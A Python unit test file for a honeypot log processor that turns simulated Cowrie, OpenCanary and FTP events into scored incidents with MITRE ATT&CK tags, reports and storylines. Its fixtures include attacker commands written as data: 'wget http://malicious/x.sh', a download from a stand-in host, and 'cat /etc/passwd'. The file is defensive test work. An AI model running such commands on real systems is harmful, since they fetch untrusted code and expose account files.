import importlib
import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch


class ProcessorFlowTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.cowrie_log = self.root / "cowrie.json"
        self.opencanary_log = self.root / "opencanary.log"
        self.ftp_log = self.root / "ftp.json"
        self.mysql_log = self.root / "mysql.json"
        self.smb_log = self.root / "smb.json"
        self.scada_log = self.root / "scada.json"
        self.db_path = self.root / "honeypotx.db"
        self.offsets_path = self.root / "offsets.json"
        self.export_path = self.root / "events_export.json"
        self.geo_cache_path = self.root / "geo_cache.json"

        for path in (
            self.cowrie_log, self.opencanary_log, self.ftp_log,
            self.mysql_log, self.smb_log, self.scada_log,
        ):
            path.write_text("", encoding="utf-8")

        self.old_env = os.environ.copy()
        os.environ.update({
            "HPX_COWRIE_LOG": str(self.cowrie_log),
            "HPX_OPENCANARY_LOG": str(self.opencanary_log),
            "HPX_FTP_LOG": str(self.ftp_log),
            # Override anche mysql/smb/scada: senza, i test leggono i log reali
            # dei container (default hardcoded) e i conteggi diventano non deterministici.
            "HPX_MYSQL_LOG": str(self.mysql_log),
            "HPX_SMB_LOG": str(self.smb_log),
            "HPX_SCADA_LOG": str(self.scada_log),
            "HPX_DB_PATH": str(self.db_path),
            "HPX_OFFSETS_PATH": str(self.offsets_path),
            "HPX_EVENTS_EXPORT_PATH": str(self.export_path),
            "HPX_GEO_CACHE_PATH": str(self.geo_cache_path),
            "HPX_ATTACK_SETTINGS_PATH": str(self.root / "attack_settings.json"),
        })

        import backend.config as config
        import backend.db as db
        import backend.geolocation as geolocation
        import backend.processor as processor
        import backend.reports as reports
        import backend.settings as settings

        self.config = importlib.reload(config)
        self.db = importlib.reload(db)
        importlib.reload(geolocation)
        self.processor_module = importlib.reload(processor)
        self.reports = importlib.reload(reports)
        self.settings = importlib.reload(settings)

    def tearDown(self):
        os.environ.clear()
        os.environ.update(self.old_env)
        self.tmp.cleanup()

    def _processor(self):
        class FakeGeoResolver:
            def resolve(self, ip):
                return {"country": "Test", "city": "Test", "lat": None, "lon": None}

        with patch.object(self.processor_module, "GeoResolver", FakeGeoResolver):
            return self.processor_module.Processor()

    def _append_json(self, path, obj):
        with path.open("a", encoding="utf-8") as f:
            f.write(json.dumps(obj) + "\n")

    def test_process_once_raises_credential_incidents_only_after_threshold(self):
        processor = self._processor()

        for minute in range(2):
            self._append_json(self.cowrie_log, {
                "eventid": "cowrie.login.failed",
                "username": "root",
                "password": f"bad-{minute}",
                "src_ip": "192.0.2.10",
                "timestamp": f"2026-04-29T18:0{minute}:00Z",
                "protocol": "ssh",
            })
        self._append_json(self.opencanary_log, {
            "dst_port": 80,
            "logtype": 3001,
            "src_host": "192.0.2.20",
            "local_time": "2026-04-29T18:00:00Z",
            "logdata": {"PATH": "/login", "USERNAME": "client", "PASSWORD": "secret"},
        })
        self._append_json(self.ftp_log, {
            "timestamp": "2026-04-29T18:00:00Z",
            "src_ip": "192.0.2.30",
            "command": "PASS",
            "argument": "secret",
        })

        self.assertEqual(processor.process_once(), 0)
        self.assertEqual(self.db.fetch_events(), [])

        self._append_json(self.cowrie_log, {
            "eventid": "cowrie.login.failed",
            "username": "root",
            "password": "bad-2",
            "src_ip": "192.0.2.10",
            "timestamp": "2026-04-29T18:02:00Z",
            "protocol": "ssh",
        })
        for minute in range(1, 3):
            self._append_json(self.opencanary_log, {
                "dst_port": 80,
                "logtype": 3001,
                "src_host": "192.0.2.20",
                "local_time": f"2026-04-29T18:0{minute}:00Z",
                "logdata": {"PATH": "/login", "USERNAME": "client", "PASSWORD": f"secret-{minute}"},
            })
            self._append_json(self.ftp_log, {
                "timestamp": f"2026-04-29T18:0{minute}:00Z",
                "src_ip": "192.0.2.30",
                "command": "PASS",
                "argument": f"secret-{minute}",
            })

        self.assertEqual(processor.process_once(), 3)
        events = self.db.fetch_events()
        self.assertEqual(len(events), 3)
        self.assertEqual({event["attack_type"] for event in events}, {"Credential Attack"})
        self.assertEqual({event["source"] for event in events}, {"cowrie", "opencanary", "ftp"})

    def test_custom_credential_threshold_is_used_by_processor(self):
        self.settings.save_attack_settings({
            "credential_threshold": 2,
            "credential_window_seconds": 600,
            "incident_bucket_seconds": 900,
        })
        processor = self._processor()

        for minute in range(2):
            self._append_json(self.cowrie_log, {
                "eventid": "cowrie.login.failed",
                "username": "root",
                "password": f"bad-{minute}",
                "src_ip": "192.0.2.70",
                "timestamp": f"2026-04-29T18:0{minute}:00Z",
                "protocol": "ssh",
            })

        self.assertEqual(processor.process_once(), 1)
        events = self.db.fetch_events()
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0]["attack_type"], "Credential Attack")

    def test_opencanary_credential_threshold_groups_different_usernames_by_ip(self):
        processor = self._processor()

        for minute, username in enumerate(["alice", "bob", "charlie"]):
            self._append_json(self.opencanary_log, {
                "dst_port": 80,
                "logtype": 3001,
                "src_host": "192.0.2.50",
                "local_time": f"2026-04-29T18:0{minute}:00Z",
                "logdata": {
                    "PATH": "/index.html",
                    "USERNAME": username,
                    "PASSWORD": f"secret-{minute}",
                },
            })

        self.assertEqual(processor.process_once(), 1)
        events = self.db.fetch_events()
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0]["source"], "opencanary")
        self.assertEqual(events[0]["ip"], "192.0.2.50")
        self.assertEqual(events[0]["attack_type"], "Credential Attack")
        self.assertGreaterEqual(events[0]["risk_score"], 35)
        context = self.db.fetch_event_context(events[0]["id"])
        self.assertIsNotNone(context)
        self.assertEqual(len(context["raw_events"]), 3)
        self.assertGreater(context["event"]["risk_score"], events[0]["risk_score"])
        self.assertEqual(
            [item["username"] for item in context["raw_events"]],
            ["alice", "bob", "charlie"],
        )
        ip_detail = self.db.fetch_ip_detail("192.0.2.50")
        self.assertIsNotNone(ip_detail)
        self.assertEqual(ip_detail["event_count"], 1)
        self.assertEqual(ip_detail["raw_event_count"], 3)
        self.assertGreaterEqual(ip_detail["risk_score"], context["event"]["risk_score"])
        self.assertEqual(
            [item["value"] for item in ip_detail["top_usernames"]],
            ["alice", "bob", "charlie"],
        )
        self.assertEqual(ip_detail["top_paths"][0]["value"], "/index.html")
        ip_report = self.reports.export_ip_report("192.0.2.50", report_format="html")
        self.assertTrue(ip_report.exists())
        self.assertIn("Report IP 192.0.2.50", ip_report.read_text(encoding="utf-8"))

        self._processor()
        events_after_reconcile = self.db.fetch_events()
        self.assertEqual(len(events_after_reconcile), 1)
        self.assertEqual(events_after_reconcile[0]["attack_type"], "Credential Attack")

    def test_process_once_deduplicates_post_login_commands_by_session(self):
        processor = self._processor()
        base = {
            "src_ip": "192.0.2.40",
            "timestamp": "2026-04-29T18:00:00Z",
            "protocol": "ssh",
            "session": "session-1",
        }
        self._append_json(self.cowrie_log, {
            **base,
            "eventid": "cowrie.login.success",
            "username": "admin",
            "password": "password",
        })
        self._append_json(self.cowrie_log, {
            **base,
            "eventid": "cowrie.command.input",
            "input": "whoami",
        })
        self._append_json(self.cowrie_log, {
            **base,
            "eventid": "cowrie.command.input",
            "input": "uname -a",
        })

        self.assertEqual(processor.process_once(), 2)
        events = self.db.fetch_events()
        self.assertEqual(len(events), 2)
        self.assertEqual(
            {event["attack_type"] for event in events},
            {"Unauthorized Login", "Post-Login Activity"},
        )

        storylines = self.db.fetch_storylines()
        self.assertEqual(len(storylines), 1)
        self.assertEqual(storylines[0]["title"], "Compromissione interattiva SSH")
        self.assertEqual(storylines[0]["event_count"], 2)
        self.assertEqual(
            [event["attack_type"] for event in storylines[0]["events"]],
            ["Unauthorized Login", "Post-Login Activity"],
        )

        post_login = next(event for event in events if event["attack_type"] == "Post-Login Activity")
        context = self.db.fetch_event_context(post_login["id"])
        self.assertIsNotNone(context)
        self.assertEqual(
            [item["command"] for item in context["raw_events"] if item["command"]],
            ["whoami", "uname -a"],
        )
        detail = self.db.fetch_incident_detail(post_login["id"])
        self.assertIsNotNone(detail)
        self.assertIn("dopo il login", detail["technical_reason"])
        self.assertGreaterEqual(detail["event"]["risk_score"], 60)
        self.assertEqual(
            [item["value"] for item in detail["evidence"]["commands"]],
            ["uname -a", "whoami"],
        )
        self.assertTrue(any(item["kind"] == "incident" for item in detail["timeline"]))

        html_report = self.reports.export_incident_report(post_login["id"], report_format="html")
        json_report = self.reports.export_incident_report(post_login["id"], report_format="json")
        self.assertTrue(html_report.exists())
        self.assertTrue(json_report.exists())
        self.assertIn("Report incidente", html_report.read_text(encoding="utf-8"))
        self.assertEqual(json.loads(json_report.read_text(encoding="utf-8"))["event"]["id"], post_login["id"])

    def test_events_are_enriched_with_mitre_and_backfilled_on_reconcile(self):
        processor = self._processor()
        base = {
            "src_ip": "192.0.2.80",
            "timestamp": "2026-04-29T18:00:00Z",
            "protocol": "ssh",
            "session": "session-mitre",
        }
        self._append_json(self.cowrie_log, {
            **base,
            "eventid": "cowrie.login.success",
            "username": "admin",
            "password": "password",
        })
        self._append_json(self.cowrie_log, {
            **base,
            "eventid": "cowrie.command.input",
            "input": "wget http://malicious/x.sh",
        })

        self.assertEqual(processor.process_once(), 2)
        events = {event["attack_type"]: event for event in self.db.fetch_events()}

        login = events["Unauthorized Login"]
        self.assertEqual(login["mitre_technique"], "T1078")
        self.assertEqual(login["mitre_technique_name"], "Valid Accounts")
        self.assertEqual(login["mitre_subtechnique"], "T1078.003")
        self.assertEqual(login["mitre_confidence"], "Alto")
        self.assertEqual(login["mitre_url"], "https://attack.mitre.org/techniques/T1078/003/")
        self.assertFalse(login["mitre_uncertain"])

        cmd = events["Command Injection"]
        self.assertEqual(cmd["mitre_technique"], "T1059")
        self.assertEqual(cmd["mitre_subtechnique"], "T1059.004")

        # Backfill: simulo righe storiche azzerando le colonne MITRE e ricreando
        # il Processor (che esegue reconcile_events all'avvio).
        with self.db.get_conn() as conn:
            conn.execute('UPDATE events SET mitre_tactic = NULL, mitre_technique = NULL, '
                         'mitre_subtechnique = NULL, mitre_confidence = NULL')
            conn.commit()
        self.assertTrue(all(e["mitre_technique"] is None for e in self.db.fetch_events()))

        self._processor()  # reconcile_events ripopola i campi MITRE
        backfilled = {event["attack_type"]: event for event in self.db.fetch_events()}
        self.assertEqual(backfilled["Unauthorized Login"]["mitre_technique"], "T1078")
        self.assertEqual(backfilled["Command Injection"]["mitre_subtechnique"], "T1059.004")

    def test_incident_detail_exposes_discovery_techniques(self):
        processor = self._processor()
        base = {
            "src_ip": "192.0.2.90",
            "timestamp": "2026-04-29T18:00:00Z",
            "protocol": "ssh",
            "session": "session-discovery",
        }
        self._append_json(self.cowrie_log, {
            **base, "eventid": "cowrie.login.success",
            "username": "admin", "password": "password",
        })
        for cmd in ["whoami", "uname -a", "cat /etc/passwd", "netstat -an", "sdaf"]:
            self._append_json(self.cowrie_log, {
                **base, "eventid": "cowrie.command.input", "input": cmd,
            })

        processor.process_once()
        events = {e["attack_type"]: e for e in self.db.fetch_events()}
        post_login = events["Post-Login Activity"]

        detail = self.db.fetch_incident_detail(post_login["id"])
        discovery_ids = {item["id"] for item in detail["discovery"]}
        self.assertIn("T1033", discovery_ids)        # whoami
        self.assertIn("T1082", discovery_ids)        # uname
        self.assertIn("T1087.001", discovery_ids)    # cat /etc/passwd
        self.assertIn("T1049", discovery_ids)        # netstat
        # il rumore "sdaf" non produce technique
        for item in detail["discovery"]:
            self.assertEqual(item["tactic"], "TA0007")

        ip_detail = self.db.fetch_ip_detail("192.0.2.90")
        self.assertIn("T1033", {item["id"] for item in ip_detail["discovery"]})

    def test_reset_attacks_clears_incidents_raw_context_and_export(self):
        processor = self._processor()
        base = {
            "src_ip": "192.0.2.60",
            "timestamp": "2026-04-29T18:00:00Z",
            "protocol": "ssh",
            "session": "session-reset",
        }
        self._append_json(self.cowrie_log, {
            **base,
            "eventid": "cowrie.login.success",
            "username": "admin",
            "password": "password",
        })
        self._append_json(self.cowrie_log, {
            **base,
            "eventid": "cowrie.command.input",
            "input": "whoami",
        })

        self.assertEqual(processor.process_once(), 2)
        self.assertEqual(len(self.db.fetch_events()), 2)

        result = processor.reset_attacks()

        self.assertEqual(result["events_deleted"], 2)
        self.assertGreaterEqual(result["raw_events_deleted"], 2)
        self.assertEqual(self.db.fetch_events(), [])
        self.assertEqual(self.export_path.read_text(encoding="utf-8"), "[]")

    def test_offset_not_advanced_when_cycle_fails_midway(self):
        processor = self._processor()
        for ip in ("192.0.2.10", "192.0.2.11"):
            self._append_json(self.cowrie_log, {
                "eventid": "cowrie.login.success",
                "username": "admin",
                "password": "password",
                "src_ip": ip,
                "timestamp": "2026-04-29T18:00:00Z",
                "protocol": "ssh",
            })

        real_insert = self.db.insert_event

        def flaky_insert(event):
            if event.get("ip") == "192.0.2.11":
                raise RuntimeError("boom")
            return real_insert(event)

        with patch.object(self.processor_module, "insert_event", flaky_insert):
            with self.assertRaises(RuntimeError):
                processor.process_once()

        # L'offset non deve avanzare: il ciclo e' fallito prima di completare il blocco.
        self.assertEqual(processor.offsets["cowrie"], 0)

        # Secondo giro senza guasto: entrambi gli eventi presenti, nessun duplicato.
        processor.process_once()
        ips = {event["ip"] for event in self.db.fetch_events()}
        self.assertEqual(ips, {"192.0.2.10", "192.0.2.11"})

    def test_fetch_stats_excludes_local_and_unknown_countries(self):
        self._processor()  # inizializza il DB
        for index, (ip, country) in enumerate([
            ("203.0.113.1", "Italy"),
            ("203.0.113.2", "France"),
            ("10.0.0.1", "Local"),
            ("203.0.113.3", "Unknown"),
        ]):
            self.db.insert_event({
                "event_hash": f"hash-{index}",
                "ip": ip,
                "country": country,
                "attack_type": "Unauthorized Login",
                "danger_level": "Alto",
            })

        stats = self.db.fetch_stats()
        self.assertEqual(stats["total"], 4)
        # Solo Italy e France: Local, Unknown (e NULL) sono esclusi dal conteggio.
        self.assertEqual(stats["countries"], 2)


if __name__ == "__main__":
    unittest.main()
